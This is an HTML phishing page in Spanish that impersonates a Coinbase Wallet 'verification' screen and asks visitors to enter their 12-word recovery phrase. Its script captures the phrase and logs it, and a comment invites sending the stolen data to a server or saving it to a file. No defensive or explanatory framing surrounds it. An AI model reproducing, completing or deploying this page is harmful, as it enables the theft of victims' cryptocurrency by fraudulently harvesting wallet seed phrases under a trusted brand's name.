<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación Coinbase Wallet</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #1e1e1e;
            color: #ffffff;
        }

        .container {
            width: 100%;
            max-width: 450px;
            margin: 50px auto;
            background-color: #1e1e1e;
            padding: 35px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
        }

        h2 {
            text-align: center;
            color: #ffffff;
            margin-bottom: 10px;
        }

        p {
            text-align: center;
            color: #bbbbbb;
            margin-bottom: 20px;
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 150px;
            height: auto;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #444;
            border-radius: 5px;
            background-color: #2a2a2a;
            color: #ffffff;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0056b3;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: #aaaaaa;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="coinbase-wallet.jpg" alt="Coinbase Wallet Logo">
        </div>
        <h2>Verificación Coinbase Wallet</h2>
        <p>Ingresa tu clave de 12 palabras de recuperación para verificar tu nueva Coinbase Wallet asociada a tu cuenta Coinbase.</p>
        <input type="text" placeholder="12 palabras de recuperación">
        <button id="verificarBtn">Verificar Wallet</button>
        <div class="footer">
            &copy; 2026 Coinbase Wallet. Todos los derechos reservados.
        </div>
    </div>

    <script>
        document.getElementById("verificarBtn").addEventListener("click", function () {
            const recoveryPhrase = document.querySelector("input[type='text']").value;
            console.log("Clave de recuperación:", recoveryPhrase);
            // Aquí puedes enviar los datos a un servidor o guardarlos en un archivo
        });
    </script>
</body>
</html>
